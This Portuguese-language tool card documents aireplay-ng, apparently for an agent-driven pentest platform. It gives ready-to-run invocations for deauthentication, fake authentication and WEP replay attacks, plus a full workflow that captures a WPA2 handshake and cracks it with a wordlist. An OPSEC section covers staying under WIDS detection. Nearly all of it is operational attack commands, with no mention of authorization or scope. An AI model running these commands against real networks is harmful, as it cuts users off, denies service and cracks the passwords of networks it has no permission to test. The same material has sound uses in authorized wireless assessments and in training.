---
name: "aireplay-ng"
description: "Ferramenta de injeção de pacotes wireless da suíte aircrack-ng. Usada para acelerar a captura de handshakes WPA/WPA2 via deautenticação forçada, reinjeção de ARP para aceleração WEP, e outros ataques de injeção 802.11. Essencial para acelerar capturas em ambientes com pouco tráfego."
---

# aireplay-ng

## Objetivo

- Forçar deautenticação de clientes para capturar handshake WPA/WPA2 rápido
- Reinjeção de pacotes ARP para acelerar coleta de IVs em redes WEP
- Ataques de fragmentação e chopchop para WEP
- Geração de tráfego artificial para análise
- Fake authentication com AP para testes de associação

## Endpoint

- /api/tools/run (tool: "aireplay-ng")
- /api/tools/dry-run (tool: "aireplay-ng")

## Requer target

- não (BSSID alvo especificado nas options com -a)

## Parâmetros

| Parâmetro | Tipo   | Obrigatório | Descrição                                          |
|-----------|--------|-------------|-----------------------------------------------------|
| options   | string | sim         | Flags incluindo modo de ataque, BSSID e interface   |

## Modos de Ataque

| Flag   | Ataque                  | Uso principal                                         |
|--------|-------------------------|-------------------------------------------------------|
| `-0 N` | Deauthentication        | Desconectar clientes para forçar reconexão (handshake)|
| `-1 N` | Fake Authentication     | Associar com AP sem conectar (necessário para WEP)    |
| `-2`   | Interactive Replay      | Reinjetar pacote específico selecionado               |
| `-3`   | ARP Request Replay      | Capturar e reinjetar ARPs para gerar IVs WEP          |
| `-4`   | KoreK Chopchop          | Descriptografar pacote WEP sem chave                  |
| `-5`   | Fragmentation           | Obter PRGA para injeção WEP                           |
| `-6`   | Café-Latte              | Recuperar chave WEP de cliente sem AP                 |
| `-9`   | Injection Test          | Testar capacidade de injeção da interface             |

## Flags Comuns

| Flag                         | Descrição                                              |
|------------------------------|--------------------------------------------------------|
| `-a AA:BB:CC:DD:EE:FF`       | BSSID do AP alvo                                       |
| `-c CC:DD:EE:FF:00:11`       | MAC do cliente alvo (para deauth direcionada)          |
| `wlan0mon`                   | Interface em modo monitor (último argumento)           |
| `-b AA:BB:CC:DD:EE:FF`       | BSSID do AP (para alguns modos)                        |
| `--ignore-negative-one`      | Ignorar erro de canal -1 em alguns drivers             |

## Exemplos

### Deauth broadcast (desconectar todos os clientes do AP)

```json
{
  "tool": "aireplay-ng",
  "options": "-0 5 -a AA:BB:CC:DD:EE:FF wlan0mon"
}
```

Envia 5 pacotes deauth broadcast. Clientes reconectam e geram handshake.

### Deauth direcionada (cliente específico)

```json
{
  "tool": "aireplay-ng",
  "options": "-0 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon"
}
```

### Fake authentication com AP (necessário para WEP)

```json
{
  "tool": "aireplay-ng",
  "options": "-1 0 -a AA:BB:CC:DD:EE:FF wlan0mon"
}
```

### ARP Request Replay (acelerar IVs WEP)

```json
{
  "tool": "aireplay-ng",
  "options": "-3 -b AA:BB:CC:DD:EE:FF wlan0mon"
}
```

### Teste de capacidade de injeção

```json
{
  "tool": "aireplay-ng",
  "options": "-9 wlan0mon"
}
```

## Workflow Deauth para Handshake WPA2

```
Terminal 1 — Captura:
  airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w /root/cap/alvo wlan0mon

Terminal 2 — Deauth:
  aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

Aguardar mensagem no airodump-ng:
  WPA handshake: AA:BB:CC:DD:EE:FF

Crack:
  aircrack-ng -w /root/wordlists/rockyou.txt /root/cap/alvo-01.cap
```

## OPSEC

- Pacotes deauth (802.11 Disassociation) são detectados por WIDS e alguns drivers
- Deauth broadcast afeta TODOS os clientes do AP — causa interrupção de serviço
- Prefira deauth direcionada (-c CLIENT_MAC) para menor impacto
- `-0 1` ou `-0 2` geralmente suficiente — menos ruído que `-0 100`
- Alguns APs modernos implementam Protected Management Frames (PMF/802.11w) — deauth pode falhar
- A injeção de pacotes requer driver e chipset compatíveis (verificar com `-9`)
- Monitorar se o AP tem clientes antes — sem clientes, não há handshake para capturar

## Saída

- JSON com campos: `success`, `stdout`, `stderr`, `report`, `artifacts`
- Confirmação de pacotes enviados e recebidos
- Para `-9` (injection test): relatório de capacidade de injeção por canal
